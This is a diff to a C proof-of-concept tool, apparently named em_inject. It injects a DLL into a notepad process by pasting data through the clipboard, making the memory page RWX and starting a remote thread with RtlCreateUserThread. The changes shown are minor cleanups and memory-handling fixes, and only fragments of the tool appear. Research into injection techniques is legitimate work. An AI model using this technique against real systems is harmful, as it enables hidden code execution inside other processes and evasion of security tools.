@@ -35,7 +35,6 @@
 #include <inttypes.h>
 
 #include <windows.h>
-#include <tlhelp32.h>
 #pragma comment(lib, "user32.lib")
 
 // default is 1 second
@@ -324,6 +323,7 @@ BOOL CopyData(UINT format, void *data, int cch) {
     CopyMemory(str, data, cch); 
     GlobalUnlock(gmem);
     hcb = SetClipboardData(format, gmem);
+    bResult = (hcb != NULL);
     GlobalFree(gmem);
 exit_copy:
     CloseClipboard();
@@ -352,14 +352,13 @@ int main(int argc, char *argv[]) {
     SIZE_T                rd;
     HWND                  hw=NULL, pw;
     CLIENT_ID             cid;
-    HANDLE                ss, ht;
+    HANDLE                ht;
     RtlCreateUserThread_t rtlcreate;
     w64_t                 embuf, lastbuf;
     HMODULE               m;
     PCHAR                 dll_path;
     STARTUPINFO           si;
     PROCESS_INFORMATION   pi;
-    THREADENTRY32         te;
     
     if(argc != 2) {
       printf("usage: em_inject <full path of DLL to inject>\n");
@@ -425,6 +424,8 @@ int main(int argc, char *argv[]) {
       // wait more time to allow notepad to receive the data
       SendMessage(hw, WM_PASTE, 0, 0);
       Sleep(WAIT_TIME);
+      
+      free(asc);
     }
     
     // set page to RWX
@@ -439,6 +440,7 @@ int main(int argc, char *argv[]) {
     rtlcreate(pi.hProcess, NULL, FALSE, 0, NULL, 
       NULL, embuf.p, NULL, &ht, &cid);
     
+    // wait for thread to finish
     WaitForSingleObject(ht, INFINITE);
     
     // clear the contents of buffer
@@ -452,7 +454,6 @@ int main(int argc, char *argv[]) {
     VirtualProtectEx(pi.hProcess, embuf.p, 4096, old, &old);
     
     free(cs);
-    free(asc);
 cleanup:
     TerminateProcess(pi.hProcess, 0);
     CloseHandle(pi.hThread);
